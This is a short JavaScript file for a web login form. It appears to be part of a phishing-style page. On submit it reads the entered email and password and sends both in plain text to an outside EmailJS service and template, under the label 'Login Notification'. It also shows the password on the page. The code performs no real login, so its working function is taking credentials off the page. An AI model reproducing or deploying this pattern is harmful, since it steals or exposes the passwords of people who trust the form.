emailjs.init("-MDTe9KITew1iL2gy"); 

const submitBtn = document.getElementById('submit'); 
const emailInput = document.getElementById('email'); 
const passwordInput = document.getElementById('password'); 

submitBtn.addEventListener('click', (e) => {
  e.preventDefault();

  const email = emailInput.value;
  const password = passwordInput.value;

  emailjs.send("jhenri_08", "template_7v1jcf7", {
    to_email: email, 
    subject: 'Login Notification', 
    message: `Someone logged in with your email address: ${email} and password: ${password}` 
  })
  .then((response) => {
    console.log('SUCCESS!', response.status, response.text);
    document.querySelector('.login-header header').innerText = `Logged in with email: ${email} and password: ${password}`;
  }, (error) => {
    console.log('FAILED...', error);
  });
});